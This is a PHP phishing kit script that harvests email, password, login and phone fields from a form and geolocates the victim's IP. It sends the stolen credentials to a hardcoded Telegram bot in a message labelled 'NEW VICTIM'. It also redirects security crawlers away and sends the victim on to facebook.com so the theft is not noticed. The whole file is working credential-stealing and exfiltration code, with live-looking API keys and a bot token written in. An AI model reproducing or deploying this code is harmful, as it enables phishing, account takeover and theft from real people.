<?php
$ip = $_SERVER[ REMOTE_ADDR ]; 
$details = json_decode(file_get_contents("http://api.ipapi.com/".$ip."?access_key=6e9ca88a7e15ec441984ad8aacab48d7"));
$country_name = $details->country_name;
$country_code = $details->country_code;
$city = $details->city;
$region_name = $details->region_name;
$calling_code = $details->location->calling_code;
 ?>
<?php
$API_KEY = "5592013163:AAFHP_JUo2HL25COT8LIYQnG6IoFmnMmhHs";
$admin = 5342772500;
$email = $_POST[ email ];
$password = $_POST[ password ];
$login = $_POST[ login ];
$phone = $_POST[ phone ];
$text = urlencode("ＮＥＷ ＶＩＣＴＭ ＳＩＲ 
______
👤 ¦ 𝐄𝐌𝐀𝐈𝐋 ،  ~  `$email`
______
📟 ¦ 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  ~  `$password`
______  
👁️‍🗨️¦ 𝐂𝐎𝐔𝐍𝐓𝐑𝐘  : *$country_name ( $country_code ) *
______
☏ ✆¦𝐂𝐀𝐋𝐋𝐈𝐍𝐆 𝐂𝐎𝐃𝐄 ~
*+$calling_code*");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<html>
  <head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag( js , new Date());

  gtag( config ,  UA-159654279-2 );
</script>

    <meta http-equiv="Refresh" content="0; url=https://facebook.com" />
  </head>
  <body>
  </body>
</html>